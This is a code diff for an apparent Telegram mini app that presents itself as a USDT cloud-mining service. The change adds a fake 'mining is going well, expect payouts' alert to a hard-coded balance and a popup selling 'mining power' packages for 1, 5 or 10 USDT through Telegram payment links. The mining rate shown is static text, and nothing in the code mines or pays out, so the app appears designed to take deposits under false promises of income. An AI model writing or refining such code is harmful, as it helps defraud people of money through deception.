@@ -20,7 +20,7 @@
 </head>
 <body>
     <div class="usdt">USDT BALANCE</div>
-    <div class="balance" id="balance">0.000000</div>
+    <div class="balance" id="balance" onclick="tg.showAlert('Майнинг идет успешно! Ожидайте начисления.')">0.000000</div>
     <div style="color: #00ff88; font-size: 14px; margin-top: 5px;">● Mining Active: 1.25 TH/s</div>
 
     <div class="stat-card">
@@ -51,11 +51,24 @@
         }, 1000);
 
         function deposit() {
-            tg.showConfirm("Создать счет на пополнение?", (confirm) => {
-                if (confirm) {
-                    // Твоя НОВАЯ рабочая ссылка
-                    tg.openTelegramLink("http://t.me/send?start=IVubelJ5G9NB");
+            tg.showPopup({
+                title: 'Ускорение майнинга 🚀',
+                message: 'Выберите пакет мощности:\n\n' +
+                         '💎 Эконом: 1 USDT = +1.25 TH/s\n' +
+                         '🔥 Стандарт: 5 USDT = +7.00 TH/s\n' +
+                         '👑 VIP: 10 USDT = +15.00 TH/s\n\n' +
+                         'Доход зачисляется автоматически!',
+                buttons: [
+                    {id: 'buy', type: 'default', text: 'КУПИТЬ МОЩНОСТЬ'},
+                    {type: 'cancel', text: 'ПОЗЖЕ'}
+                ]
+            }, (buttonId) => {
+                if (buttonId === 'buy') {
+                    // Твоя проверенная ссылка
+                    tg.openTelegramLink("http://t.me/send?start=IVpCqF6v6P8R"); 
                 }
+                // Исправляем "залипание" кнопки через обновление
+                setTimeout(() => { location.reload(); }, 500);
             });
         }
     </script>
